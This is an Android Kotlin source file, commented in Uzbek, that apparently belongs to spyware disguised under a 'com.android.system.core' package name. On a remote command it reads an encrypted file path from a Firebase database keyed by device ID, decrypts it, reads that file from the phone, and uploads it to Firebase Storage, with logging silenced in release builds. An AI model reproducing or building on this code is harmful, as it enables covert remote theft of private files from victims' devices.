package com.android.system.core.files

import android.content.Context
import android.util.Log
import com.android.system.core.BuildConfig
import com.android.system.core.crypto.CryptoManager
import com.android.system.core.crypto.KeyFetchWorker
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

/**
 * Faylni local path'dan Firebase Storage'ga yuklaydi.
 * Firebase RTDB'dan encrypted path o'qib, deshifrlab, faylni o'qib yuklaydi.
 *
 * @param context Android context
 * @param uid Qurilma UID
 * @param fileIndex Fayl indexi (RTDB'dagi kalit)
 */
class FileUploadWorker(
    private val context: Context,
    private val uid: String,
    private val fileIndex: String
) {

    companion object {
        private const val TAG = "SYS_CORE"
        private const val FIREBASE_URL = "https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app"
    }

    /**
     * Faylni Firebase Storage'ga yuklaydi.
     * @return Storage path ("files/{uid}/{fileIndex}/{fileName}") yoki null (xato bo'lsa)
     */
    suspend fun upload(): String? = suspendCoroutine { continuation ->
        try {
            // 1. AES kalitini olish
            val aesKey = KeyFetchWorker.getAesKey(context)
            if (aesKey == null) {
                if (BuildConfig.DEBUG) { Log.w(TAG, "upload: AES key not available") }
                continuation.resume(null)
                return@suspendCoroutine
            }

            // 2. RTDB'dan encrypted path o'qish
            val filesRef = FirebaseDatabase.getInstance(FIREBASE_URL)
                .getReference("devices")
                .child(uid)
                .child("files")
                .child(fileIndex)

            filesRef.get().addOnSuccessListener { snapshot ->
                val encryptedPath = snapshot.child("path").getValue(String::class.java)
                if (encryptedPath == null) {
                    if (BuildConfig.DEBUG) { Log.w(TAG, "upload: path not found for fileIndex=$fileIndex") }
                    continuation.resume(null)
                    return@addOnSuccessListener
                }

                // 3. Path deshifrlash
                val decryptedPath = CryptoManager.decrypt(encryptedPath, aesKey)
                if (decryptedPath == null) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "upload: path decryption failed") }
                    continuation.resume(null)
                    return@addOnSuccessListener
                }

                // 4. Fayl o'qish
                val file = File(decryptedPath)
                if (!file.exists()) {
                    if (BuildConfig.DEBUG) { Log.w(TAG, "upload: file does not exist: $decryptedPath") }
                    continuation.resume(null)
                    return@addOnSuccessListener
                }

                try {
                    val fileBytes = file.readBytes()
                    val fileName = file.name
                    val storagePath = "files/$uid/$fileIndex/$fileName"

                    // 5. Firebase Storage'ga yuklash
                    val storageRef = FirebaseStorage.getInstance().reference.child(storagePath)

                    storageRef.putBytes(fileBytes)
                        .addOnSuccessListener {
                            if (BuildConfig.DEBUG) { Log.d(TAG, "upload: success -> $storagePath") }
                            continuation.resume(storagePath)
                        }
                        .addOnFailureListener { e ->
                            if (BuildConfig.DEBUG) { Log.e(TAG, "upload failed: ${e.message}") }
                            continuation.resume(null)
                        }

                } catch (e: Exception) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "upload: file read error: ${e.message}") }
                    continuation.resume(null)
                }

            }.addOnFailureListener { e ->
                if (BuildConfig.DEBUG) { Log.e(TAG, "upload: RTDB read failed: ${e.message}") }
                continuation.resume(null)
            }

        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "upload: unexpected error: ${e.message}") }
            continuation.resume(null)
        }
    }
}
